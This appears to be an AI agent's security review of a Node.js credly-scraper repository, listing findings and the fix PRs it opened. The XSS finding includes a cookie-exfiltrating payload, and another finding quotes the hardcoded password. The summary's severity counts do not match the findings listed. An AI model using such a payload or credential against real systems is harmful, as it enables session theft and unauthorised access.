# Security Review: credly-scraper

**Date:** 2026-05-06
**Reviewer:** Claude (automated security review)
**Language/Framework:** Node.js / Express
**Dev branch:** `claude/intelligent-johnson-uuU0g`

A prior review (`security-review-credly-scraper.md` on `main`, dated 2026-04-17) was used as a reference, but every finding below was re-verified against the **current** code on `main` (commit `9cef95f`). All findings remain present in the live source.

## Summary

- Total findings: 7
- Critical: 1 | High: 2 | Medium: 3 | Low: 1
- PRs opened: 4
  - https://github.com/FlorianCasse/credly-scraper/pull/16  (auth + static exposure)
  - https://github.com/FlorianCasse/credly-scraper/pull/17  (XSS via innerHTML)
  - https://github.com/FlorianCasse/credly-scraper/pull/18  (helmet + rate limiting)
  - https://github.com/FlorianCasse/credly-scraper/pull/19  (Subresource Integrity for JSZip CDN)
- Issues opened: 0 — **GitHub Issues are disabled on this repository** (`410 Gone` from the API). The non-PR-ready findings (#5, #6, #7 below) are documented in this report instead. They are tagged with the requested severity labels in this file; the same severity labels (`Claude`, `security`, `severity-*`) are applied to every PR.

## Findings

### [CRITICAL] Hardcoded password fallback in server.js
- **File:** `server.js` (line 8)
- **Description:** `const PASSWORD = process.env.APP_PASSWORD || 'certificationitq1!';` ships a literal credential in public source. Anyone reading the repo can authenticate to `POST/DELETE /api/profiles` if `APP_PASSWORD` is unset (and many local/dev deployments will leave it unset).
- **Remediation:** Remove the fallback, require `APP_PASSWORD` (>= 8 chars), exit on startup if missing, and use `crypto.timingSafeEqual` instead of `!==` for the compare.
- **PR-ready:** yes
- **Action taken:** PR #16 https://github.com/FlorianCasse/credly-scraper/pull/16

### [HIGH] Timing-unsafe password comparison
- **File:** `server.js` (lines 270 and 297, `password !== PASSWORD`)
- **Description:** Plain `!==` on strings is variable-time. Combined with the lack of rate limiting (finding #4 historically), this is a textbook side-channel. The CWE is CWE-208.
- **Remediation:** `crypto.timingSafeEqual` over equal-length buffers, with an explicit length pre-check.
- **PR-ready:** yes
- **Action taken:** PR #16 (same PR as the CRITICAL finding) https://github.com/FlorianCasse/credly-scraper/pull/16

### [HIGH] XSS via innerHTML with untrusted Credly data
- **File:** `script.js` — `createBadgeCard`, `createCommonCard`, `renderByCertification`, `initQuickSelect`, `renderOneProfile`
- **Description:** Badge template names, issuer names, descriptions, and Credly user `first_name`/`last_name` are spliced into `innerHTML` template literals with no escaping. A Credly account whose name is `<img src=x onerror=fetch('//x?'+document.cookie)>` (or any future Credly content-injection bug) becomes script execution in every viewer's browser. Custom country names entered through the modal are also rendered via `innerHTML`. The `data-url="${badge.image_url}"` attribute is also susceptible to attribute-injection escapes.
- **Remediation:** Replace every `innerHTML` write of untrusted data with `createElement` + `textContent`, and capture event-handler URLs in JS state instead of attributes.
- **PR-ready:** yes
- **Action taken:** PR #17 https://github.com/FlorianCasse/credly-scraper/pull/17

### [HIGH] Repo root exposed via express.static(__dirname)
- **File:** `server.js` (line 12)
- **Description:** `app.use(express.static(__dirname, { index: false, extensions: ['html', 'css', 'js'] }))` serves the entire repository root. `GET /server.js`, `GET /credly_badge_downloader.sh`, `GET /package.json`, `GET /data/custom-profiles.json` (the user list of "custom" Credly profiles) all return 200 with the contents. Server source disclosure also reveals the password env-var name and any future logic flaws.
- **Remediation:** Replace `express.static(__dirname, …)` with explicit `GET` handlers for the three public files (`index.html`, `script.js`, `style.css`). Optionally move them to a `public/` subdirectory.
- **PR-ready:** yes
- **Action taken:** PR #16 (rolled into the auth PR; same file is touched) https://github.com/FlorianCasse/credly-scraper/pull/16

### [MEDIUM] Missing security headers (no helmet) and no rate limiting
- **File:** `server.js`
- **Description:** No CSP, HSTS, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy headers are emitted, and there's no rate limiter on either the password-gated profile endpoints (brute-force) or the `/api/credly` proxy and `/api/batch-badges*` endpoints (abuse / DoS pivot).
- **Remediation:** Add `helmet()` with a CSP that allows `cdnjs.cloudflare.com` (the JSZip script) plus `data:` / `blob:` images; add `express-rate-limit` with a strict policy on writes and a looser one on the proxy; cap JSON body size; `app.set('trust proxy', 1)` so the limiter sees the real client IP.
- **PR-ready:** yes
- **Action taken:** PR #18 https://github.com/FlorianCasse/credly-scraper/pull/18

### [MEDIUM] Missing Subresource Integrity on JSZip CDN script
- **File:** `index.html` (line ~123)
- **Description:** `<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>` has no `integrity` hash. A cdnjs compromise or a TLS MITM swaps in a malicious bundle that runs in the page origin, can read every Credly response, and can read the password the user types into the `prompt()` dialog.
- **Remediation:** Add the official cdnjs `sha512-…` integrity attribute, `crossorigin="anonymous"`, `referrerpolicy="no-referrer"`. Also add `rel="noopener noreferrer"` to the existing `target="_blank"` GitHub link (reverse-tabnabbing).
- **PR-ready:** yes
- **Action taken:** PR #19 https://github.com/FlorianCasse/credly-scraper/pull/19

### [MEDIUM] Synchronous file I/O on every profile request
- **File:** `server.js` — `readProfiles()` (`fs.readFileSync`), `writeProfiles()` (`fs.writeFileSync`)
- **Description:** Every `GET /api/profiles`, `POST /api/profiles`, and `DELETE /api/profiles` blocks the Node event loop on synchronous file I/O. Because `GET /api/profiles` is unauthenticated, an attacker can stall the entire server (Credly proxy + SSE included) by spamming this endpoint, especially as `data/custom-profiles.json` grows. Concurrent writes also race against each other (lost-update on the JSON file).
- **Remediation:** Switch to `fs.promises` async APIs, cache the parsed JSON in memory and invalidate on writes, serialise writes with a small mutex, and write atomically (`tmp` + `rename`).
- **PR-ready:** no — interacts with the rate-limit/auth changes already in flight; deliberately deferred so the higher-severity fixes can land cleanly.
- **Action taken:** Issues are disabled on this repo; documented here in lieu of opening one. (Severity label on this file: `severity-medium`.)

### [LOW] No HTTPS enforcement
- **File:** `server.js`
- **Description:** The server listens over plain HTTP and the password is transmitted in the JSON body. If this is exposed across an untrusted network the password is sniffable.
- **Remediation:** Deploy behind a TLS-terminating reverse proxy. In production, redirect when `req.headers['x-forwarded-proto'] !== 'https'`. The helmet PR (#18) already enables HSTS, but it's only meaningful if the server is actually reachable over TLS.
- **PR-ready:** no — deployment-config concern, not a code change.
- **Action taken:** Issues are disabled on this repo; documented here. (Severity label on this file: `severity-low`.)

### [LOW] credly_badge_downloader.sh: filename / argument hygiene
- **File:** `credly_badge_downloader.sh`
- **Description:** Several minor defects when the script is run against a hostile Credly profile or a hostile API response: `extract_username` accepts anything matching `[^/]+`, the resulting `username` is used unsanitised in the output directory name; `${counter}_${badge_id}.${ext}` interpolates `badge_id` straight from the API JSON (a malicious `id` containing `/` puts files outside the target dir); the `process_image` line invokes `$magick_cmd` unquoted; `curl -s -L` follows arbitrary redirects with no `--max-redirs`/`--proto =https`/`--max-time`. None are exploitable in the web app (the script is not invoked by `server.js`), so this is LOW.
- **Remediation:** Sanitize `username`, `badge_id`, and `ext` (regex `[A-Za-z0-9._-]`, length cap, reject leading `.`). Quote `"$magick_cmd"`. Pass `--max-redirs 5 --max-time 30 --proto =https --tlsv1.2` to `curl`. Use `set -euo pipefail`.
- **PR-ready:** no — needs testing on macOS with the actual ImageMagick/tesseract toolchain; deferred.
- **Action taken:** Issues are disabled on this repo; documented here. (Severity label on this file: `severity-low`.)

## Notes on process

- All four PRs target the dev branch `claude/intelligent-johnson-uuU0g`, **not** `main`. None are merged, per instructions.
- Every PR has the labels `Claude`, `security`, and the appropriate `severity-*`.
- Issues are disabled at the repo level (HTTP `410 Gone` from `POST /repos/.../issues`), so the three non-PR-ready findings live in this report rather than as individual issues.
- The prior 2026-04-17 report noted accumulated unmerged security PRs. That observation still holds: 12+ prior `security/*` and `claude/*` branches contain overlapping fixes for the same findings. Recommend triaging and merging one of them rather than letting more PRs accumulate.
